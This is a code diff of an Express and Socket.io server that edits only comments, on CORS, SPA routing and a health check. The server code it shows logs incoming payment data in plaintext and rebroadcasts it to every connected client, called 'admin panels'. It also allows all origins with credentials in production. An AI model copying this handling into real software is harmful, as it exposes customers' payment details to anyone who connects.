@@ -11,10 +11,10 @@ const __dirname = path.dirname(__filename);
 const app = express();
 const server = createServer(app);
 
-// Configure CORS for Socket.io
+// Configure CORS for Socket.io based on environment
 const corsOptions = {
   origin: process.env.NODE_ENV === 'production' 
-    ? true
+    ? true // Allow all origins in production (Render.com handles HTTPS)
     : ["http://localhost:5173", "http://localhost:3000"],
   methods: ["GET", "POST"],
   credentials: true
@@ -29,6 +29,7 @@ const io = new Server(server, {
 if (process.env.NODE_ENV === 'production') {
   app.use(express.static(path.join(__dirname, 'dist')));
   
+  // Handle React routing - serve index.html for all non-API routes
   app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, 'dist', 'index.html'));
   });
@@ -42,7 +43,7 @@ io.on('connection', (socket) => {
   socket.on('payment-data', (data) => {
     console.log('Payment data received:', data);
     
-    // Broadcast to all connected clients (admin panels)
+    // Emit to admin panel (broadcast to all connected clients)
     socket.broadcast.emit('payment-received', data);
   });
 
@@ -50,14 +51,14 @@ io.on('connection', (socket) => {
   socket.on('visitor-joined', (data) => {
     console.log('Visitor joined:', data);
     
-    // Broadcast to all connected clients (admin panels)
+    // Emit to admin panel (broadcast to all connected clients)
     socket.broadcast.emit('visitor-joined', data);
   });
 
   socket.on('visitor-left', (data) => {
     console.log('Visitor left:', data);
     
-    // Broadcast to all connected clients (admin panels)
+    // Emit to admin panel (broadcast to all connected clients)
     socket.broadcast.emit('visitor-left', data);
   });
 
@@ -88,7 +89,7 @@ io.on('connection', (socket) => {
   });
 });
 
-// Health check endpoint
+// Health check endpoint for Render.com
 app.get('/health', (req, res) => {
   res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
 });
